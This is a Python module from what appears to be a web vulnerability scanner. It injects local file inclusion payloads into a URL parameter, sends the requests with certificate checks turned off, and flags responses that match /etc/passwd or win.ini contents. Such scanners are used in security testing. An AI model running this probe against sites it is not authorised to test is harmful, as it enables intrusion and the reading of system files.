import requests
import re
from core import nano
from core import regex
from core import decoder_encoder
from core import jsonInjector
from core import detactor
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


rg1="root:[x*]:0:0:"
rg2="\\[(font|extension|file)s\\]"


def lfi_(url):
    x=detactor.detactor_(url)
    y=decoder_encoder.decoder_(x)
    
    if(y):
        if nano.isJson(y)== True:
            for i in regex.LFI:
                z=jsonInjector.main_(y,i)
                payload=decoder_encoder.encoder_(z)
                link=url.replace(x,payload)

                try:
                    r = requests.get(link,verify=False,timeout=13)
                    resp= r.content
                    x1 = re.search(rg1, str(resp))
                    x2 = re.search(rg2, str(resp))
                    if (x1) or (x2):
                        print('\033[91mPossibly LFI vulnerability\033[00m  '+link)
                except:
                    pass
        else:
            for i in regex.LFI:
                payload=decoder_encoder.encoder_(i)
                link=url.replace(x,payload)

                try:
                    r = requests.get(link,verify=False,timeout=13)
                    resp= r.content
                    x1 = re.search(rg1, str(resp))
                    x2 = re.search(rg2, str(resp))
                    if (x1) or (x2):
                        print('\033[91mPossibly LFI vulnerability\033[00m  '+link)
                except:
                    pass
   
    else:
        for i in regex.LFI:
            payload=decoder_encoder.encoder_(i)
            link=url.replace(x,payload)

            try:
                r = requests.get(link,verify=False,timeout=13)
                resp= r.content
                x1 = re.search(rg1, str(resp))
                x2 = re.search(rg2, str(resp))
                if (x1) or (x2):
                    print('\033[91mPossibly LFI vulnerability\033[00m  '+link)
            except:
                pass
